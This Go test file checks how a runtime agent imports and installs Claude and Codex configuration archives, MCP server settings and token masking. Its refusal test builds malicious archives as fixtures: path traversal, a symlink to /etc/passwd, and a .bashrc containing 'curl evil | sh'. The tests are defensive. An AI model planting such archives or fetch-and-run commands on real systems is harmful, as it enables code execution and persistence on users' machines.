package workspace

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"

	"runtime-agent/internal/dotenv"
)

type tarEntry struct {
	name string
	body string
	kind byte
}

func configArchive(t *testing.T, entries ...tarEntry) ([]byte, string) {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, e := range entries {
		kind := e.kind
		if kind == 0 {
			kind = tar.TypeReg
		}
		h := &tar.Header{Name: e.name, Mode: 0o644, Size: int64(len(e.body)), Typeflag: kind, Linkname: "/etc/passwd"}
		if kind != tar.TypeReg {
			h.Size = 0
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if kind == tar.TypeReg {
			if _, err := tw.Write([]byte(e.body)); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(buf.Bytes())
	return buf.Bytes(), "sha256:" + hex.EncodeToString(sum[:])
}

func serve(t *testing.T, data []byte) string {
	t.Helper()
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write(data) }))
	t.Cleanup(server.Close)
	return server.URL
}

// An imported setup is installed item by item: what the box made itself is
// kept, an item a later import drops goes, and Claude is launched with the
// MCP servers and settings, their keys masked.
func TestAgentConfigInstallsItemsAndLaunchesWithThem(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	s := NewService(t.TempDir())
	ctx := context.Background()
	writeTestFile(t, filepath.Join(home, ".claude", "skills", "boxmade", "SKILL.md"), "made here")

	first, digest := configArchive(t,
		tarEntry{name: ".claude/", kind: tar.TypeDir},
		tarEntry{name: ".claude/CLAUDE.md", body: "be brief"},
		tarEntry{name: ".claude/skills/review/", kind: tar.TypeDir},
		tarEntry{name: ".claude/skills/review/SKILL.md", body: "review well"},
		tarEntry{name: ".claude/agents/scout.md", body: "scout"},
		tarEntry{name: ".codex/AGENTS.md", body: "codex rules"},
	)
	mcp := map[string]json.RawMessage{"tracker": json.RawMessage(`{"type":"http","url":"https://mcp.example","headers":{"Authorization":"Bearer tok-0123456789abcdef"}}`)}
	settings := map[string]json.RawMessage{"enabledPlugins": json.RawMessage(`{"review@market":true}`)}
	if err := s.SetAgentConfig(ctx, AgentConfigRequest{Version: "v1", URL: serve(t, first), SHA256: digest, MCPServers: mcp, Settings: settings}); err != nil {
		t.Fatal(err)
	}
	for path, want := range map[string]string{
		".claude/CLAUDE.md": "be brief", ".claude/skills/review/SKILL.md": "review well", ".claude/agents/scout.md": "scout",
		".codex/AGENTS.md": "codex rules", ".claude/skills/boxmade/SKILL.md": "made here",
	} {
		if got := readFile(filepath.Join(home, path)); got != want {
			t.Errorf("%s = %q, want %q", path, got, want)
		}
	}
	argv := withAgentConfig([]string{"claude"})
	if !slices.Equal(argv, []string{"claude", "--mcp-config", mcpConfigPath(home), "--settings", settingsPath(home)}) {
		t.Errorf("launch = %q", argv)
	}
	if info, _ := os.Stat(mcpConfigPath(home)); info == nil || info.Mode().Perm() != 0o600 {
		t.Error("the MCP servers' file is not owner-only")
	}
	masked := strings.Join(s.RedactionSecrets(), "\n")
	if !strings.Contains(masked, "tok-0123456789abcdef") {
		t.Errorf("an MCP header's token is not masked: %q", masked)
	}

	second, digest2 := configArchive(t, tarEntry{name: ".claude/CLAUDE.md", body: "be briefer"})
	if err := s.SetAgentConfig(ctx, AgentConfigRequest{Version: "v2", URL: serve(t, second), SHA256: digest2}); err != nil {
		t.Fatal(err)
	}
	if fileExists(filepath.Join(home, ".claude", "skills", "review")) || fileExists(filepath.Join(home, ".codex", "AGENTS.md")) {
		t.Error("items the new import dropped are still installed")
	}
	if readFile(filepath.Join(home, ".claude", "CLAUDE.md")) != "be briefer" || !fileExists(filepath.Join(home, ".claude", "skills", "boxmade")) {
		t.Error("the new import didn't replace CLAUDE.md, or took the box's own skill")
	}
	if fileExists(mcpConfigPath(home)) || fileExists(settingsPath(home)) {
		t.Error("MCP servers or settings left from the earlier import")
	}
}

// An archive that isn't the one imported, or holds anything but a setup's
// files and folders, is refused and nothing of it installed.
func TestAgentConfigRefusesWhatIsNotASetup(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	s := NewService(t.TempDir())
	good, _ := configArchive(t, tarEntry{name: ".claude/CLAUDE.md", body: "x"})
	cases := map[string]AgentConfigRequest{
		"another digest": {Version: "v", URL: serve(t, good), SHA256: "sha256:" + strings.Repeat("0", 64)},
	}
	for name, entries := range map[string][]tarEntry{
		"a path out of home":       {{name: "../evil", body: "x"}},
		"a file Claude reads keys": {{name: ".claude/settings.json", body: "{}"}},
		"a shell profile":          {{name: ".bashrc", body: "curl evil | sh"}},
		"a link":                   {{name: ".claude/skills/x/link", kind: tar.TypeSymlink}},
	} {
		data, digest := configArchive(t, entries...)
		cases[name] = AgentConfigRequest{Version: "v", URL: serve(t, data), SHA256: digest}
	}
	for name, req := range cases {
		if err := s.SetAgentConfig(context.Background(), req); !errors.Is(err, ErrInvalidAgentConfig) {
			t.Errorf("%s: %v", name, err)
		}
	}
	for _, path := range []string{"../evil", ".claude/settings.json", ".bashrc", ".claude/CLAUDE.md", ".claude/skills/x"} {
		if fileExists(filepath.Join(home, path)) {
			t.Errorf("%s was installed", path)
		}
	}
}

func writeTestFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestMCPCredentialsInURLsAndArgsAreMasked(t *testing.T) {
	values := func(entries []dotenv.Entry) []string {
		var out []string
		for _, e := range entries {
			out = append(out, e.Value)
		}
		return out
	}
	if got := values(urlTokens("https://user:p4ssw0rdValue@mcp.example.com/sse?api_key=k3yValue123&format=json")); !slices.Contains(got, "p4ssw0rdValue") || !slices.Contains(got, "k3yValue123") {
		t.Errorf("urlTokens = %q", got)
	}
	got := values(argTokens([]string{"-y", "@acme/mcp", "--api-key", "abc123def456", "--token=t0kenValue9", "--port", "3000"}))
	if !reflect.DeepEqual(got, []string{"abc123def456", "t0kenValue9"}) {
		t.Errorf("argTokens = %q", got)
	}
}
